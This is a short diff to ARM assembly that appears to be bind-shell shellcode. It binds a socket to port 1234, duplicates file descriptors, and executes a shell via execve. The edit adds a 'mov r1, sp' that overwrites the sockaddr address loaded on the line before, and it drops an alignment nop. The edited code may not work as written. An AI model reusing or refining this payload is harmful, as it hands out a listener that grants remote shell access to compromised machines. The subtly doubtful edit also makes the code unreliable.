@@ -27,7 +27,8 @@ _start:
     
     // bind(s, &sa, sizeof(sa));  
     mov    r2, #16      // r2 = sizeof(sa)
-    adr    r1, sin_port // r1 = sa.sin_port   
+    adr    r1, sin_port // r1 = sa.sin_port
+    mov    r1, sp   
     add    r7, #1       // r7 = 281+1 = 282 = bind
     svc    1
   
@@ -64,7 +65,6 @@ dup_loop:
     strb   r2, [r0, #7] // add null terminator    
     mov    r7, #11      // r7 = execve
     svc    1
-    nop                 // alignment by 4 bytes
 sin_port:    
 .word  0xd2040002
 sh:    
